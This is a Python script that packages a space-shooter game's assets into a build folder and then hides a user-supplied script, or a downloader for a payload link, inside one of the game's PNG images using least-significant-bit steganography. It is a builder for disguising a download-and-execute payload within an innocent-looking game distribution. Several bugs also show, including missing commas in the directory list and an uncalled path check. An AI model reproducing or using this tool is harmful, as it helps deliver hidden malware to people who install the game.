from PIL import Image
import os 
import shutil
from getfilefromlink import return_downloader

def create_directory_structure(build_dir):

    #Creates a directory structure with subdirectories and copies provided files.
    

    #define the directory structure
    subdirs = [
        "Assets",
        "Assets/sounds",
        "Assets/sounds/grenades"
        "Assets/sounds/grenades/bullets"
        "Assets/sounds/grenades/gel"
        "Assets/sounds/visual"
        "Assets/images",
        "Assets/images/image"
    ]
    
    source_files = {
        "Assets": ["./src/Assets/Grenade+1.mp3", "./src/Assets/Gun+Silencer.mp3", "./src/Assets/space.png", "./src/Assets/spaceship_red.png", "./src/Assets/spaceship_yellow.png"],
        "Assets/sounds": ["./src/Assets/sounds/Grenade+1.mp3"],
        "Assets/sounds/grenades/bullets": ["./src/Assets/sounds/grenades/bullets/guns1.mp3", "./src/Assets/sounds/grenades/bullets/guns2.mp3", "./src/Assets/sounds/grenades/bullets/guns3.mp3", "./src/Assets/sounds/grenades/bullets/guns4.mp3"],
        "Assets/sounds/grenades/gel": ["./src/Assets/sounds/grenades/gel/dong.mp3", "./src/Assets/sounds/grenades/gel/genesis1.mp3", "./src/Assets/sounds/grenades/gel/genesis7.mp3", "./src/Assets/sounds/grenades/gel/ging.mp3", "./src/Assets/sounds/grenades/gel/img88.mp3", "./src/Assets/sounds/grenades/gel/ship1.mp3", "./src/Assets/sounds/grenades/gel/ship5.mp3", "./src/Assets/sounds/grenades/gel/shipper.mp3"],
        "Assets/sounds/visual": ["./src/Assets/sounds/visual/visual1.mp3"],
        "Assets/images/image": ["./src/Assets/images/image/space113.png", "./src/Assets/images/image/space1115.png", "./src/Assets/images/image/space7553.png"]
    }
    
    base_files = [
        "./src/main.py",
        "./src/requirements.txt",
        "./src/tempCodeRunnerFile.py"
    ]

    default_dir = f"{os.getcwd()}/dist"

    try: 
        #create default folder if user input is empty
        if build_dir == '':
            build_dir = default_dir
            #if default folder exists create default folder n+1
            if os.path.exists(default_dir) and os.listdir(default_dir): 
                num_count = 1
                path_exists = True
                while path_exists:
                    build_dir = default_dir+str(num_count)
                    if not os.path.exists(build_dir):
                        path_exists = False
                    else:
                        num_count += 1
                print(f"No Path selected, {default_dir} exists and is not empty. Files will be created at {build_dir}")
            elif os.path.exists(default_dir) and os.listdir(default_dir):
                build_dir = default_dir
                print(f"No Path selected. Defaulting to: {build_dir}")     
                        

        if not os.path.exists(build_dir):
            os.makedirs(build_dir)
            print(f"created build directory {build_dir}")

        elif os.path.exists(build_dir) and os.listdir(build_dir):
            print("Chosen Directory is not empty please choose an empty directory ")
            return 

        #add files to base_dir 
        for file_path in base_files:
            if os.path.exists(file_path):
                shutil.copy(file_path, build_dir)
                print(f"copied {file_path} to {build_dir}")
            else:
                print(f"**\nBase File {file_path} not found**")
        
        #create subdirectories and copy files 
        for subdir in subdirs:
            subdir_path = os.path.join(build_dir, subdir)
            os.makedirs(subdir_path, exist_ok=True)
            print(f"Created subdirectory: {subdir_path}")

            # copy files to subdirectories if they exist in source_files 
            if subdir in source_files:
                for file_path in source_files[subdir]:
                    if os.path.exists(file_path):
                        shutil.copy(file_path, subdir_path)
                        print(f"Copied {file_path} to {subdir_path}")
                    else:
                        print(f"**\nFile: {file_path} not found**")
    except Exception as e:
        print(f"Error: {e}")
    return(build_dir)
    
        
    
def hide_payload():
    default_image_path = f"{base_dir}/Assets/images/image/space113.png"
    default_output_path = f"{base_dir}/Assets/images/image"
    
    #handle script input
    script_path = input("\nEnter the path to the script that should be embedded\n OR\n press 1 if you want the payload to download and execute the file from a link:\n")
    if script_path == "1":
        link = input("Enter the link to your payload: ")
        script = return_downloader(link=link)
    elif script_path != 1 and os.path.exists(script_path):
        with open(script_path, 'r') as script_file:
                script = script_file.read()
    else:
        print(f"Specified script path {script_path} doesn't exist")
        return
    
    #habndle image input
    image_path = input("Enter the path to the image the payload should be embedded to (press Enter to use default image): ")
    if image_path == "":
        image_path = default_image_path
        print(f"No Path entered. Defaulting to {image_path}")
    
    elif image_path != "" and os.path.exists(image_path): 
        print(f"Image at {image_path} will be used")
    else:
        print(f"specified image path {image_path} doesn't exist")
        return
    
    #handle ouput path input
    output_path = input("Enter the path to which the payload should be saved to (press Enter to use default Path): ")
    if output_path == "":
        output_path = default_output_path
        print(f"No Path entered. Defaulting to {output_path}")
    elif output_path != "" and os.path.exists:
        print(f"building payload at {output_path}")
    else:
        print(f"specified path {output_path} doesn't exist")
        return

    # Convert script to binary
    binary_script = ''.join(format(ord(i), '08b') for i in script)
    img = Image.open(image_path)
    pixels = img.load()

    binary_script += '00000000'  # Null terminator to indicate the end of the script
    binary_index = 0

    for i in range(img.size[0]):
        for j in range(img.size[1]):
            if binary_index < len(binary_script):
                r, g, b = pixels[i, j]
                r = (r & ~1) | int(binary_script[binary_index])
                binary_index += 1
                pixels[i, j] = (r, g, b)
            else:
                break

    img.save(f'{output_path}/14113.png')
    print("\n\n Payload was created successfully!")

if __name__ == "__main__":
    directory_input = input(f"Enter the directory to which the base files will be built (press Enter for default): ")
    base_dir = create_directory_structure(build_dir=directory_input)
    hide_payload()
